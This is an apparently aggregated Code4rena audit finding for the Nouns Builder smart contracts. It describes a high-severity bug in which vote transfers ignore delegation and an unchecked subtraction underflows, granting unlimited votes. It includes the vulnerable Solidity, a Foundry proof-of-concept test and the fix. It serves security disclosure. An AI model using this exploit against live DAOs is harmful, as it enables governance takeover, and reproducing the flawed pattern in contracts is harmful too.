---
# Core Classification
protocol: Nouns Builder
chain: everychain
category: uncategorized
vulnerability_type: unknown

# Attack Vector Details
attack_type: unknown
affected_component: smart_contract

# Source Information
source: solodit
solodit_id: 3263
audit_firm: Code4rena
contest_link: https://code4rena.com/contests/2022-09-nouns-builder-contest
source_link: https://code4rena.com/reports/2022-09-nouns-builder
github_link: https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/469

# Impact Classification
severity: high
impact: security_vulnerability
exploitability: 0.00
financial_impact: high

# Scoring
quality_score: 0
rarity_score: 0

# Context Tags
tags:

protocol_categories:
  - liquid_staking
  - cdp
  - services
  - launchpad
  - synthetics

# Audit Details
report_date: unknown
finders_count: 12
finders:
  - 0x4non
  - PwnPatrol
  - davidbrai
  - scaraven
  - izhuer
---

## Vulnerability Title

[H-01] User can get unlimited votes

### Overview


This bug report is about a vulnerability found in the code for the ERC721Votes token. The vulnerability is caused by the `aftertokenTransfer` function in ERC721Votes, which transfers votes between user addresses instead of the delegated addresses. This allows a user to cause an overflow in `_moveDelegates` and get unlimited votes. The bug was found using the Foundry tool. The recommended mitigation step is to change the delegate transfer in `afterTokenTransfer` to `_moveDelegateVotes(delegates(_from), delegates(_to), 1)`.

### Original Finding Content


`aftertokenTransfer` in ERC721Votes transfers votes between user addresses instead of the delegated addresses, so a user can cause overflow in `_moveDelegates` and get unlimited votes.

### Proof of Concept

<https://github.com/code-423n4/2022-09-nouns-builder/blob/7e9fddbbacdd7d7812e912a369cfd862ee67dc03/src/lib/token/ERC721Votes.sol#L268>

        function _afterTokenTransfer(
            address _from,
            address _to,
            uint256 _tokenId
        ) internal override {
            // Transfer 1 vote from the sender to the recipient
            _moveDelegateVotes(_from, _to, 1);

            super._afterTokenTransfer(_from, _to, _tokenId);
        }

<https://github.com/code-423n4/2022-09-nouns-builder/blob/7e9fddbbacdd7d7812e912a369cfd862ee67dc03/src/lib/token/ERC721Votes.sol#L216>

        _moveDelegateVotes(prevDelegate, _to, balanceOf(_from));
        ...
        unchecked {
                    ...
                    // Update their voting weight
                    _writeCheckpoint(_from, nCheckpoints, prevTotalVotes, prevTotalVotes - _amount);
                }

During delegation `balanceOf(from)` amount of votes transferred are to the `_to` address

        function test_UserCanGetUnlimitedVotes() public {

            vm.prank(founder);
            auction.unpause();

            vm.prank(bidder1);
            auction.createBid{ value: 1 ether }(2);

            vm.warp(10 minutes + 1 seconds);

            auction.settleCurrentAndCreateNewAuction();
            
            assertEq(token.ownerOf(2), bidder1);

            console.log(token.getVotes(bidder1)); // 1
            console.log(token.delegates(bidder1)); // 0 bidder1

            vm.prank(bidder1);
            token.delegate(bidder2);

            console.log(token.getVotes(bidder1)); // 1
            console.log(token.getVotes(bidder2)); // 1

            vm.prank(bidder1);
            auction.createBid{value: 1 ether}(3);

            vm.warp(22 minutes);

            auction.settleCurrentAndCreateNewAuction();

            assertEq(token.ownerOf(3), bidder1);

            console.log(token.balanceOf(bidder1)); // 2
            console.log(token.getVotes(bidder1)); // 2
            console.log(token.getVotes(bidder2)); // 1

            vm.prank(bidder1);        
            token.delegate(bidder1);

            console.log(token.getVotes(bidder1)); // 4
            console.log(token.getVotes(bidder2)); // 6277101735386680763835789423207666416102355444464034512895     
      }

When user1 delegates to another address `balanceOf(user1)` amount of tokens are subtraced from user2's votes, this will cause underflow and not revert since the statements are unchecked

### Tools Used

Foundry

### Recommended Mitigation Steps

Change delegate transfer in `afterTokenTransfer` to

            _moveDelegateVotes(delegates(_from), delegates(_to), 1);

**[Alex the Entreprenerd (judge) increased severity to High and commented](https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/469#issuecomment-1257276491):**
 > The warden has shown how to exploit:
> - An unchecked section of the code
> - An incorrect logic in moving tokenDelegation
> 
> To trigger an underflow that gives each user the maximum voting power.
> 
> While some setup is necessary (having 1 token), I think the exploit is impactful enough to warrant High Severity, as any attacker will be able to obtain infinite voting power on multiple accounts.
>
> In contrast to other reports, this finding (as well as it's duplicates) are using an unchecked operation to negatively overflow the amount of votes to gain the maximum value.

**[tbtstl (Nouns Builder) confirmed](https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/469)**



***



### Metadata

| Field | Value |
|-------|-------|
| Impact | HIGH |
| Quality Score | 0/5 |
| Rarity Score | 0/5 |
| Audit Firm | Code4rena |
| Protocol | Nouns Builder |
| Report Date | N/A |
| Finders | 0x4non, PwnPatrol, davidbrai, scaraven, izhuer, rotcivegaf, Picodes, saian, Ch_301, Soosh, MEP, R2 |

### Source Links

- **Source**: https://code4rena.com/reports/2022-09-nouns-builder
- **GitHub**: https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/469
- **Contest**: https://code4rena.com/contests/2022-09-nouns-builder-contest

### Keywords for Search

`vulnerability`

